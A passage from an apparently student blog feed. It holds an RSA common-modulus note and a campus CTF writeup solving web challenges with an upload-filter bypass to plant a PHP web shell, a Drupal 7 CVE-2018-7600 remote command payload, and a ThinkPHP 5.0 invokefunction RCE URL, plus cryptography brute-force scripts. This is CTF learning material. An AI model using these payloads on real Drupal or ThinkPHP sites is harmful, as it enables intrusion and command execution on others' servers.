class="comment"># s &amp; t</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    message1 = gmpy2.invert(message1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    message2 = gmpy2.invert(message2, n)</span><br><span class="line">plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure><p>得出结果明文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1021089710312311910410111011910111610410511010710511610511511211111511510598108101125</span><br></pre></td></tr></table></figure><p>这时候需要考虑当时明文是如何转化为这个数字了，这个应该是 ASCII 字符转换，进而我们使用如下代码得到 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">plain = str(plain)</span><br><span class="line"><span class="keyword">while</span> i &lt; len(plain):</span><br><span class="line">    <span class="keyword">if</span> plain[i] == <span class="string">'1'</span>:</span><br><span class="line">        flag += chr(int(plain[i:i + <span class="number">3</span>]))</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(int(plain[i:i + <span class="number">2</span>]))</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">###flag&#123;whenwethinkitispossible&#125;###</span></span><br></pre></td></tr></table></figure><h2 id="有效性和合理性分析-2"><a href="#有效性和合理性分析-2" class="headerlink" title="有效性和合理性分析"></a>有效性和合理性分析</h2><p>公钥加密中密钥1024bit的密钥强度只能相当于对称加密中几十bit的强度，而且密钥的生成需要时间，所以还是对称加密的效率较高，而且耗时较短，速度比较快；一般通信中采用的就是明文采用对称加密的方法发出，而加解密密钥用公钥加密体制加密后发给接收方，这样效率会比较高；</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;终于放假了，整理一波之前密码学笔记和课程设计
    
    </summary>
    
      <category term="密码学学习" scheme="https://gardenia30.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF双月赛Writeup</title>
    <link href="https://gardenia30.top/2019/01/14/CUMT-CTF%E5%8F%8C%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>https://gardenia30.top/2019/01/14/CUMT-CTF双月赛Writeup/</id>
    <published>2019-01-14T07:01:43.000Z</published>
    <updated>2019-11-10T12:34:34.520Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>萌新入坑的校赛~<a id="more"></a></p><h1 id="第一次月赛"><a href="#第一次月赛" class="headerlink" title="第一次月赛"></a>第一次月赛</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p>题目描述是可以上传图片的，就随手上传一张图片上去<br><img src="https://s1.ax1x.com/2018/12/16/FdJD6P.png" alt=""></p><p>回显出目录结构如下：<br><img src="https://s1.ax1x.com/2018/12/16/FdJym8.png" alt=""></p><p>访问URL发现可以看到上传的图片：<br><img src="https://s1.ax1x.com/2018/12/16/FdNWfH.png" alt=""><br>知道了上传目录，现在要做的就是上传成功一个Web Shell。</p><p>连接Cknife，写了个php小马，上传发现不可以上传以php结尾的文件。</p><p>第一次抓包尝试加00截断，未果。</p><p>第二次将后缀改成1.php.abc可以成功上传，但是设置Cknife需要连接的时候发现connection：close，应该是不能将上传的1.php.abc成功解析,未果。</p><p>第三次将后缀改成php5，可以上传成功，连接Cknife，成功进入，应该这次可以将haha.php5成功解析：<br><img src="https://s1.ax1x.com/2018/12/16/Fdd9FU.png" alt=""><br><img src="https://s1.ax1x.com/2018/12/16/Fdaxe0.png" alt=""></p><p>在upload文件夹中找了半天，全都是别人上传的文件，最后在根目录发现了flag：<br><img src="https://s1.ax1x.com/2018/12/16/FddrXn.png" alt=""><br><img src="https://s1.ax1x.com/2018/12/16/Fdw8CF.png" alt=""></p><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>hint不需要扣分，就窥视了一下，提示是drupal7的CVE漏洞。</p><p>Google一波，看看大佬写的博客，贴个链接：</p><p><a href="https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-" target="_blank" rel="noopener">https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-</a></p><p><a href="https://www.jianshu.com/p/7c410db788ed" target="_blank" rel="noopener">https://www.jianshu.com/p/7c410db788ed</a></p><p>先创建账号，发现不可以发送email，Google到的结果告诉我更换新密码的页面是存在漏洞的，所以输入用户名的时候直接拿bp截断，构造post：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?q=user%2Fpassword&amp;name%5B%23post_render%5D%5B%5D=system&amp;name%5B%23markup%5D=ls%20/&amp;name%5B%23type%5D=markup</span><br><span class="line"></span><br><span class="line">form_id=user_pass&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure><p>这里原来的命令需要修改，将其改为ls%20/，目的是查看根目录，Go一下回显form_build_id：</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWuDO.png" alt=""></p><p>保留这个form_build_id，用Hackbar post一下这个form_build_id，如下图：</p><p><img src="https://s1.ax1x.com/2018/12/16/FdW2rT.png" alt=""></p><p>抓包截断，go一下回显根目录，发现flag文件，</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWsGn.png" alt=""></p><p>下一步就是尝试打开这个flag文件，所以重复上述操作，将之前的ls命令换成<code>cat%20/flag</code>即可。（需要注意的是这里的空格需要使用url编码%20，之前没有注意到这个点，导致回显不出数据）</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWECR.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/12/16/FdWiE4.png" alt=""></p><h3 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h3><p>是个新题正好是前段时间爆出来的新漏洞：ThinkPHP 5.0 &amp; 5.1远程命令执行漏洞，前些日子看合天公众号推送了一篇类似的文章正好派上用场：<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652849500&amp;idx=1&amp;sn=faf67baccbc970a179e679ea378fdc92&amp;chksm=bd5939918a2eb087cd34eff02f4bb0186190f15dda841e299923717de222df913db1a89acb1d&amp;mpshare=1&amp;scene=23&amp;srcid=1216eedEBA61VyEXXfPPHC1R#rd" target="_blank" rel="noopener">click here</a></p><p>题目提示是tp5.0版本，文章直接有payload：</p><p><code>命令执行：</code></p><p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[系统命令]</code></p><p>先<code>ls /</code>列出根目录下的所有目录，发现flag文件；</p><p><a href="https://imgchr.com/i/Fxggu6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/14/Fxggu6.md.png" alt="Fxggu6.md.png"></a></p><p>然后直接查看flag文件即可：</p><p><img src="https://s2.ax1x.com/2019/01/14/FxgqDf.png" alt="FxgqDf.png"></p><p>payload:</p><p><code>http://219.219.61.234:10005/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>之前还没有认真学习过密码学的东西，好在期末好好复习了密码学，现在已经对密码学的知识有了个初步的认识，来温习一下上次的crypto</p><h3 id="现代密码签到题"><a href="#现代密码签到题" class="headerlink" title="现代密码签到题"></a>现代密码签到题</h3><p>拿到这题，看到<code>n,c1,c2,e1,e2</code>基本已经锁定这一题就是RSA的共模攻击，但是所给的参数全部都是字母，按理说应该都是数字才对，所以最难的工作就是将这一堆的字母转化为可用的数字；</p><p>先统计一下字母的出现频率：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">n=<span class="string">"ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI"</span></span><br><span class="line">c1=<span class="string">"ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI"</span></span><br><span class="line">c2=<span class="string">"IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT"</span></span><br><span class="line">e1=<span class="string">"IIIBTZBg"</span></span><br><span class="line">e2=<span class="string">"gbATZgI"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_each_char_1</span><span class="params">(string)</span>:</span></span><br><span class="line">    res = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            res[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res[i] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"n:"</span>+str((count_each_char_1(n)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c1:"</span>+str((count_each_char_1(c1)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c2:"</span>+str((count_each_char_1(c2)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e1:"</span>+str((count_each_char_1(e1)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e2:"</span>+str((count_each_char_1(e2)))</span><br></pre></td></tr></table></figure><p><strong>Result</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n:&#123;&apos;A&apos;: 65, &apos;B&apos;: 63, &apos;E&apos;: 56, &apos;g&apos;: 52, &apos;I&apos;: 60, &apos;O&apos;: 72, &apos;S&apos;: 56, &apos;b&apos;: 62, &apos;T&apos;: 69, &apos;Z&apos;: 62&#125;</span><br><span class="line">c1:&#123;&apos;A&apos;: 55, &apos;b&apos;: 62, &apos;E&apos;: 66, &apos;g&apos;: 60, &apos;I&apos;: 67, &apos;O&apos;: 58, &apos;S&apos;: 65, &apos;B&apos;: 59, &apos;T&apos;: 53, &apos;Z&apos;: 72&#125;</span><br><span class="line">c2:&#123;&apos;A&apos;: 67, &apos;B&apos;: 61, &apos;E&apos;: 51, &apos;g&apos;: 60, &apos;I&apos;: 57, &apos;O&apos;: 63, &apos;S&apos;: 66, &apos;b&apos;: 63, &apos;T&apos;: 70, &apos;Z&apos;: 59&#125;</span><br><span class="line">e1:&#123;&apos;I&apos;: 3, &apos;Z&apos;: 1, &apos;B&apos;: 2, &apos;T&apos;: 1, &apos;g&apos;: 1&#125;</span><br><span class="line">e2:&#123;&apos;A&apos;: 1, &apos;b&apos;: 1, &apos;g&apos;: 2, &apos;I&apos;: 1, &apos;T&apos;: 1, &apos;Z&apos;: 1&#125;</span><br></pre></td></tr></table></figure><p>发现总共就出现了10个字母<code>A,B,E,g,I,O,S,b,T,Z</code>,猜想这10个字母对应的是0-9的10个数字，如何将字母和数字进行对应是个头疼的问题；想了半天，没办法，只能暴力破解，产生字母的全排列对应10个数字…</p><p><strong>暴力破解脚本</strong>(借鉴队友脚本学习了一下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">dic_alp1=[<span class="string">'O'</span>,<span class="string">'T'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'b'</span>,<span class="string">'Z'</span>,<span class="string">'I'</span>,<span class="string">'E'</span>,<span class="string">'S'</span>,<span class="string">'g'</span>]</span><br><span class="line">dic_num=[<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">dic_alp2=list(itertools.permutations(dic_alp1))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_alp2:</span><br><span class="line">n=<span class="string">"ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI"</span></span><br><span class="line">c1=<span class="string">"ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI"</span></span><br><span class="line">c2=<span class="string">"IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT"</span></span><br><span class="line">e1=<span class="string">"IIIBTZBg"</span></span><br><span class="line">e2=<span class="string">"gbATZgI"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">n=n.replace(x[i],dic_num[i])</span><br><span class="line">c1=c1.replace(x[i],dic_num[i])</span><br><span class="line">c2=c2.replace(x[i],dic_num[i])</span><br><span class="line">e1=e1.replace(x[i],dic_num[i])</span><br><span class="line">e2=e2.replace(x[i],dic_num[i])</span><br><span class="line"></span><br><span class="line">n=int(n,<span class="number">10</span>)</span><br><span class="line">c1=int(c1,<span class="number">10</span>)</span><br><span class="line">c2=int(c2,<span class="number">10</span>)</span><br><span class="line">e1=int(e1,<span class="number">10</span>)</span><br><span class="line">e2=int(e2,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> gmpy2.gcd(e1,e2)!=<span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">mgcd,s,t=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="keyword">if</span> s&lt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s=-s</span><br><span class="line">c1=gmpy2.invert(c1,n)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> t&lt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">t=-t</span><br><span class="line">c2=gmpy2.invert(c2,n)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">plain=pow(c1,s,n)*pow(c2,t,n)%n</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">ans = <span class="string">'&#123;:x&#125;'</span>.format(plain).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>先用出现字母的全排列对应表0-9这10个数，然后将所有参数用数字表示，用RSA的共模攻击求出最后的结果，发现flag：</p><p><a href="https://imgchr.com/i/kS6qQ1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/16/kS6qQ1.md.png" alt="kS6qQ1.md.png"></a></p><p>最后发现是与数字形状相似的字母代替数字产生的参数…… </p><p><strong>attention：</strong>其实可以对脚本进行优化，因为<code>e1</code>和<code>e2</code>都是和<code>φ(n)</code>互素的，所以<code>e1</code>和<code>e2</code>都是奇数，所以可以缩小<code>e1</code>和<code>e2</code>的范围，最后一个数字都是奇数，即：<code>g</code>和<code>I</code>都是奇数；</p><h3 id="古典密码签到题"><a href="#古典密码签到题" class="headerlink" title="古典密码签到题"></a>古典密码签到题</h3><p>这题直接告诉是棋盘密码，比较简单，给出的密文里总共有<code>ksynb</code>5个字母，所以直接构造这5个字母的全排列对应26字母表即可，总共有5!=120种不同的结果，可以直接暴破；</p><p><strong>暴力破解脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">key=[]</span><br><span class="line">cipher=<span class="string">"ksyssskkysynbssbbnynnb"</span></span><br><span class="line">dic_cip=list(itertools.permutations(<span class="string">"ksynb"</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_cip:</span><br><span class="line">    key.append(<span class="string">''</span>.join(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> child_key <span class="keyword">in</span> key:</span><br><span class="line">    num_c=<span class="string">""</span></span><br><span class="line">    ans=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c <span class="keyword">in</span> cipher:</span><br><span class="line">        num_c+=str(child_key.index(now_c))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(num_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii=int(num_c[i])*<span class="number">5</span>+int(num_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">"i"</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        ans+=chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">print</span> child_key,ans</span><br></pre></td></tr></table></figure><p>发现有两种结果里面有<code>flag</code>字符，显然是第一个，排列方式为<code>skynb</code>；</p><p><img src="https://s2.ax1x.com/2019/01/16/kS4Yuj.png" alt="kS4Yuj.png"></p><h3 id="First-level"><a href="#First-level" class="headerlink" title="First level"></a>First level</h3><p>题目给出<code>e=2</code>，基本已经锁定是RSA的衍生算法rabin，yafu分解n得到p和q如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PRP617 = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span><br><span class="line">PRP617 = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span><br><span class="line"></span><br><span class="line">ans = 1</span><br><span class="line"></span><br><span class="line">eof; done processing batchfile</span><br></pre></td></tr></table></figure><p><strong>攻击脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span 